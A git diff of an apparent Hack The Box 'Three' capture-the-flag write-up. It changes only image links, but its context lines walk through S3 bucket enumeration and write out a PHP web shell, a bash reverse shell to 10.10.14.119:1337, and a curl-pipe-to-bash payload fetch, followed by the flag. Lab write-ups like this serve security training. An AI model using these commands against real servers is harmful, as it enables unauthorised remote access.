@@ -53,7 +53,7 @@ Answer: 2
 
 We see port 80 open on the target, when browsing the website of the target, going to Contact we see the email address.
 
-<figure><img src="../../../.gitbook/assets/image (105) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>
 
 Answer: thetoppers.htb
 
@@ -71,9 +71,9 @@ Answer: /etc/hosts
 
 After editing the host file to map the IP to the domain, we can use Gobuster to help enumerate the site.
 
-<figure><img src="../../../.gitbook/assets/image (102) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (756).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>
 
 Answer: s3.thetoppers.htb
 
@@ -107,7 +107,7 @@ Answer: aws configure
 
 After configuring aws
 
-<figure><img src="../../../.gitbook/assets/image (108) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>
 
 we can look at the S3 documentation.
 
@@ -119,11 +119,11 @@ Answer: aws s3 ls
 
 Looking at the buckets with: `aws --endpoint=http://s3.thetoppers.htb s3 ls`
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (739).png" alt=""><figcaption></figcaption></figure>
 
 we can go into this further: `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>
 
 With this basic info we can see this would use PHP
 
@@ -141,7 +141,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 With the shell file created, we can use `cp` to get the file onto the server and run CMD.
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>
 
 Confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php.
 
@@ -154,15 +154,15 @@ Now lets make a revershell script
 bash -i >& /dev/tcp/10.10.14.119/1337 0>&1
 ```
 
-<figure><img src="../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>
 
 Going to open a netcat shell with `nc -nvlp 1337`&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (109) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (693).png" alt=""><figcaption></figcaption></figure>
 
 Now open a temp webserver to pull our script from: `python3 -m http.server 8081`&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (11) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (781).png" alt=""><figcaption></figcaption></figure>
 
 Now we can use curl to get our script onto the server and executing it:
 
@@ -170,10 +170,10 @@ http://thetoppers.htb/shell.php?cmd=curl%20%3C10.10.14.119%3E:8081/shell.sh|bash
 
 We now can see our reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>
 
 Now we can locate the flag and cat it's contents
 
-<figure><img src="../../../.gitbook/assets/image (106) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>
 
 Answer: a980d99281a28d638ac68b9bf9453c2b
